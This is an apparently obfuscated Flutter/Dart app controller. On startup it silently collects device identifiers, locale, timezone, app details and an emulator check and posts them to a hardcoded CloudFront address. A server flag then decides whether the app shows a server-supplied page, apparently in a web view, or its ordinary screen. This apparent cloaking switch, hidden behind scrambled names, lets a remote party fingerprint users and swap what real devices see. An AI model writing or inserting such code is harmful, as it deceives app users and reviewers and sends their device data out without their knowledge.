import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class PourRichEndLogic extends GetxController {

  var gjydtpv = RxBool(false);
  var cdumjelk = RxBool(true);
  var fzuebpg = RxString("");
  var kxgpevcs = RxBool(false);
  var phstyme = RxBool(true);
  final xhlsnpzbum = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    nwbz();
  }


  Future<void> nwbz() async {
    kxgpevcs.value = true;
    phstyme.value = true;
    cdumjelk.value = false;

    xhlsnpzbum.post("https://dfdantvfvsd77.cloudfront.net/WvwH6",data: await gmptezh()).then((value) {
      var qrhcsn = value.data["qrhcsn"] as String;
      var mahwfc = value.data["mahwfc"] as bool;
      if (mahwfc) {
        fzuebpg.value = qrhcsn;
        twvfqe();
      } else {
        zgfv();
      }
    }).catchError((e) {
      cdumjelk.value = true;
      phstyme.value = true;
      kxgpevcs.value = false;
    });
  }

  Future<Map<String, dynamic>> gmptezh() async {
    final DeviceInfoPlugin sebxmr = DeviceInfoPlugin();
    PackageInfo sgdtvz_okhzumd = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var sihc = Platform.localeName;
    var BdjVIgO = currentTimeZone;

    var OgIqt = sgdtvz_okhzumd.packageName;
    var SGmdcnW = sgdtvz_okhzumd.version;
    var yREB = sgdtvz_okhzumd.buildNumber;

    var GTAwkaro = sgdtvz_okhzumd.appName;
    var ROto = "";
    var yMVaLIR  = "";
    var spJtbGcg = "";
    var gbnl = "";
    var ejygdr = "";
    var dleyusmg = "";


    var ecEuM = "";
    var AkWiM = false;

    if (GetPlatform.isAndroid) {
      ecEuM = "android";
      var tiuehwnvy = await sebxmr.androidInfo;

      spJtbGcg = tiuehwnvy.brand;

      ROto  = tiuehwnvy.model;
      yMVaLIR = tiuehwnvy.id;

      AkWiM = tiuehwnvy.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ecEuM = "ios";
      var hracfsdlo = await sebxmr.iosInfo;
      spJtbGcg = hracfsdlo.name;
      ROto = hracfsdlo.model;

      yMVaLIR = hracfsdlo.identifierForVendor ?? "";
      AkWiM  = hracfsdlo.isPhysicalDevice;
    }
    var res = {
      "yMVaLIR": yMVaLIR,
      "yREB": yREB,
      "SGmdcnW": SGmdcnW,
      "OgIqt": OgIqt,
      "ROto": ROto,
      "BdjVIgO": BdjVIgO,
      "spJtbGcg": spJtbGcg,
      "sihc": sihc,
      "ecEuM": ecEuM,
      "GTAwkaro": GTAwkaro,
      "AkWiM": AkWiM,
      "gbnl" : gbnl,
      "ejygdr" : ejygdr,
      "dleyusmg" : dleyusmg,

    };
    return res;
  }

  Future<void> zgfv() async {
    Get.offNamed("/pour_tab");
  }

  Future<void> twvfqe() async {
    Get.offNamed("/home_see");
  }

}
